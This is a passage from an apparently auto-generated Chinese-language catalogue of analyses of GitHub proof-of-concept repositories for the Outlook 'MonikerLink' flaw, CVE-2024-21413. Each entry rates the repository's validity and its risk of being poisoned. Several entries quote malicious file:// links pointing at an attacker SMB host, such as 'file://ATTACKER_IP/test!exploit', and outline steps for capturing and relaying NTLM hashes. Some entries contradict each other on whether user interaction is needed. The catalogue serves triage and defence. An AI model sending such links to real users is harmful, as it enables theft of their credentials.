**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

